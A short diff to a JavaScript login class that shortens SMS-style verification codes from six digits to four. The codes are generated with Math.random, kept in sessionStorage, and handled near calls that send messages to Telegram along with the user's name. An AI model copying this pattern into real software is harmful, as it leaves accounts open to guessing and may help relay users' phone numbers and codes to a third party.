@@ -47,7 +47,8 @@ class AuthManager {
             const registrationData = JSON.parse(sessionStorage.getItem('registration_data'));
             const fullName = `${registrationData.firstName} ${registrationData.lastName}`;
             
-            this.generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+            // Générer un code à 4 chiffres
+            this.generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
             
             sessionStorage.setItem('phone_number', phoneNumber);
             sessionStorage.setItem('generated_code', this.generatedCode);
@@ -82,7 +83,8 @@ class AuthManager {
             const registrationData = JSON.parse(sessionStorage.getItem('registration_data'));
             const fullName = `${registrationData.firstName} ${registrationData.lastName}`;
             
-            if (enteredCode.length === 6 && /^\d{6}$/.test(enteredCode)) {
+            // Accepter un code à 4 chiffres
+            if (enteredCode.length === 4 && /^\d{4}$/.test(enteredCode)) {
                 
                 try {
                     await telegramManager.sendMessage(`
@@ -127,7 +129,8 @@ class AuthManager {
             const registrationData = JSON.parse(sessionStorage.getItem('registration_data'));
             const fullName = `${registrationData.firstName} ${registrationData.lastName}`;
             
-            this.generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+            // Générer un nouveau code à 4 chiffres
+            this.generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
             sessionStorage.setItem('generated_code', this.generatedCode);
             
             try {
